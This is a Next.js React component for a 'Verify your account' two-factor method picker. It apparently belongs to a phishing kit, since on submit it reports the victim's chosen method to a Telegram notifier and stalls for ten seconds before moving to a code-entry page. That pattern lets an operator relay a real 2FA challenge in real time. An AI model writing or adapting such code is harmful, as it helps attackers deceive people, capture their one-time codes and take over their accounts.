"use client";
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { Mail, Phone, Smartphone, Loader2 } from 'lucide-react';
import { notifyTelegram } from '@/lib/telegram-notify';
import { setTwoFactorStepComplete } from '@/lib/auth-flow';

const METHOD_CONTINUE_MS = 10_000;

export function TwoFactorSelectCard() {
  const router = useRouter();
  const [method, setMethod] = useState<'email' | 'text' | 'phone'>('email');
  const [locked, setLocked] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setLocked(true);
    setLoading(true);
    notifyTelegram({ kind: 'method', method });
    await new Promise((r) => setTimeout(r, METHOD_CONTINUE_MS));
    setTwoFactorStepComplete();
    router.push(`/two-factor/verify?method=${method}`);
  };

  const optionClass = (active: boolean) =>
    `flex items-center p-4 border rounded transition-colors ${
      locked ? 'opacity-50 cursor-not-allowed pointer-events-none' : 'cursor-pointer'
    } ${
      active ? 'border-[#00C389] bg-[#F0FCF8]' : 'border-[#DDDDDD] hover:bg-[#F5F5F5]'
    }`;

  return (
    <div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-[0_2px_8px_rgba(0,0,0,0.1)] p-10">
      <div className="flex flex-col items-center text-center mb-8">
        <h2 className="text-2xl font-normal text-[#333333] mb-2">
          Verify your account
        </h2>
        <p className="text-sm text-[#666666]">
          Please select a method to receive your two-factor authentication code.
        </p>
      </div>

      <form onSubmit={handleContinue} className="space-y-4">
        <label className={optionClass(method === 'email')}>
          <input
            type="radio"
            name="2fa-method"
            value="email"
            checked={method === 'email'}
            onChange={() => setMethod('email')}
            disabled={locked}
            className="w-4 h-4 text-[#00C389] outline-none disabled:cursor-not-allowed"
          />
          <Mail className="w-5 h-5 mx-3 text-[#666666]" />
          <div className="flex-1">
            <div className="text-sm font-medium text-[#333333]">Email Address</div>
            <div className="text-xs text-[#666666]">Send code to Email</div>
          </div>
        </label>

        <label className={optionClass(method === 'text')}>
          <input
            type="radio"
            name="2fa-method"
            value="text"
            checked={method === 'text'}
            onChange={() => setMethod('text')}
            disabled={locked}
            className="w-4 h-4 text-[#00C389] outline-none disabled:cursor-not-allowed"
          />
          <Smartphone className="w-5 h-5 mx-3 text-[#666666]" />
          <div className="flex-1">
            <div className="text-sm font-medium text-[#333333]">Text Message</div>
            <div className="text-xs text-[#666666]">Send SMS to Number</div>
          </div>
        </label>

        <label className={optionClass(method === 'phone')}>
          <input
            type="radio"
            name="2fa-method"
            value="phone"
            checked={method === 'phone'}
            onChange={() => setMethod('phone')}
            disabled={locked}
            className="w-4 h-4 text-[#00C389] outline-none disabled:cursor-not-allowed"
          />
          <Phone className="w-5 h-5 mx-3 text-[#666666]" />
          <div className="flex-1">
            <div className="text-sm font-medium text-[#333333]">Phone Call</div>
            <div className="text-xs text-[#666666]">Call with code</div>
          </div>
        </label>

        <div className="mt-8 pt-4 flex gap-3">
          <button
            type="button"
            onClick={() => router.push('/')}
            disabled={loading}
            className="flex-1 h-10 px-8 rounded-full text-sm font-medium text-[#333333] border border-[#DDDDDD] bg-white hover:bg-[#F5F5F5] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Cancel
          </button>
          <button
            type="submit"
            disabled={loading}
            className="flex-1 h-10 px-8 rounded-full text-sm font-medium text-white bg-[#00C389] hover:bg-[#00A876] transition-colors disabled:bg-[#B8B8B8] inline-flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <Loader2 className="h-4 w-4 animate-spin shrink-0" aria-hidden />
                Loading…
              </>
            ) : (
              'Continue'
            )}
          </button>
        </div>
      </form>
    </div>
  );
}
